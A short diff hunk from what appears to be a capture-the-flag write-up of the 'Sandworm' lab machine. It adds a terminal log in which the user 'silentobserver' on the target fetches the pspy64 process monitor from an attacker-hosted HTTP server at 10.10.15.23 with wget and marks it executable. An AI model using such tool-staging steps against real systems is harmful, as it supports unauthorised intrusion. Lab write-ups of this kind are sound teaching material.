@@ -217,4 +217,18 @@ We deploy pspy to monitor the running tasks.
 
 `❯ python3 -m http.server 80`
 
+```ruby
+silentobserver@sandworm:~$ wget 10.10.15.23/pspy64
+--2023-08-26 17:33:55--  http://10.10.15.23/pspy64
+Connecting to 10.10.15.23:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 3104768 (3.0M) [application/octet-stream]
+Saving to: ‘pspy64’
 
+pspy64                                  100%[==============================================================================>]   2.96M  3.64MB/s    in 0.8s    
+
+2023-08-26 17:33:56 (3.64 MB/s) - ‘pspy64’ saved [3104768/3104768]
+
+silentobserver@sandworm:~$ chmod +x pspy64
+
+```
